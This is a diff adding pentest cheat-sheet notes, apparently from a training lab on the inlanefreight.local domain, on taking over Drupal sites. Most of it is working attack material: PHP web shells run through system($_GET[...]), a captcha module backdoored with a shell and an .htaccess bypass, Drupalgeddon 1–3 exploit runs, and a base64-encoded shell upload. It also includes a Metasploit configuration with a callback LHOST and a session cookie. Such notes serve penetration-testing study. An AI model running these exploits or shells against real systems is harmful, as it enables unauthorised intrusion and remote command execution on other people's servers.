@@ -1978,7 +1978,69 @@ sqlmap -u "http://www.example.com/?id=1" --os-shell
 - curl -s http://drupal.inlanefreight.local/CHANGELOG.txt
 - droopescan scan drupal -u http://drupal.inlanefreight.local
 - https://www.cvedetails.com/vulnerability-list/vendor_id-1367/product_id-2387/Drupal-Drupal.html
-- 
+
+- Leveraging the PHP Filter Module
+	--> log in as an admin and enable the PHP filter module --> check box next to the module and scroll down to Save configuration. Next, we could go to Content --> Add content and create a Basic page.
+	--> create a page with a malicious PHP snippet system($_GET['cmd']);  We named the parameter with an md5 hash instead of the common cmd to get in the practice of not potentially leaving a door open to 	an attacker during our assessment.
+	--> set Text format drop-down to PHP code. After clicking save, we will be redirected to the new page, in this example http://drupal-qa.inlanefreight.local/node/3.
+	--> curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
+	
+- Leveraging the PHP Filter Module (version 8 )
+	--> wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
+	--> Once downloaded go to Administration > Reports > Available updates. http://drupal.inlanefreight.local/admin/reports/updates/install
+	--> Browse, select the file from the directory we downloaded it to, and then click Install.
+	--> Once the module is installed, we can click on Content and create a new basic page, similar to how we did in the Drupal 7 example. Again, be sure to select PHP code from the Text format dropdown.
+
+- Uploading a Backdoored Module
+	--> Download the archive and extract its contents.
+	--> get --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
+	--> tar xvf captcha-8.x-1.2.tar.gz
+	--> Create a PHP web shell with the contents:
+		<?php
+		system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
+		?>
+	--> Next, we need to create a .htaccess file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the /modules folder.
+		<IfModule mod_rewrite.c>
+		RewriteEngine On
+		RewriteBase /
+		</IfModule>
+	--> The configuration above will apply rules for the / folder when we request a file in /modules. Copy both of these files to the captcha folder and create an archive.
+		- mv shell.php .htaccess captcha
+		- tar cvf captcha.tar.gz captcha/
+		- ssuming we have administrative access to the website, click on Manage and then Extend on the sidebar. Next, click on the + Install new module button, and we will be taken to the install page, 			such as http://drupal.inlanefreight.local/admin/modules/install Browse to the backdoored Captcha archive and click Install.
+		- curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
+
+- Leveraging Known Vulnerabilities
+	- Drupalgeddon
+		--> POC:- https://www.exploit-db.com/exploits/34992
+		--> python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
+		--> Now let's see if we can log in as an admin. We can! Now from here, we could obtain a shell through the various means discussed previously in this section.
+		--> We could also use the exploit/multi/http/drupal_drupageddon Metasploit module to exploit this.
+	- Drupalgeddon2
+		--> POC:- https://www.exploit-db.com/exploits/44448
+		--> python3 drupalgeddon2.py
+		--> curl -s http://drupal-dev.inlanefreight.local/hello.txt
+		--> Now let's modify the script to gain remote code execution by uploading a malicious PHP file.
+			<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>
+		--> echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
+		--> echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
+		--> run the modified exploit script to upload our malicious PHP file.
+		--> python3 drupalgeddon2.py
+		--> curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
+	-Drupalgeddon3
+		--> POC:- https://github.com/rithchard/Drupalgeddon3
+		--> Drupalgeddon3 is an authenticated remote code execution vulnerability that affects multiple versions of Drupal core. It requires a user to have the ability to delete a node. We can exploit this 		using Metasploit, but we must first log in and obtain a valid session cookie.
+		--> Once we have the session cookie, we can set up the exploit module as follows.
+			- multi/http/drupal_drupageddon3
+			- set rhosts 10.129.42.195
+			- set VHOST drupal-acc.inlanefreight.local
+			- set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
+			- set DRUPAL_NODE 1
+			- set LHOST 10.10.14.15
+			- show options
+			- exploit
+			- meterpreter > getuid
+
 ```
 ### Splunk
 ```
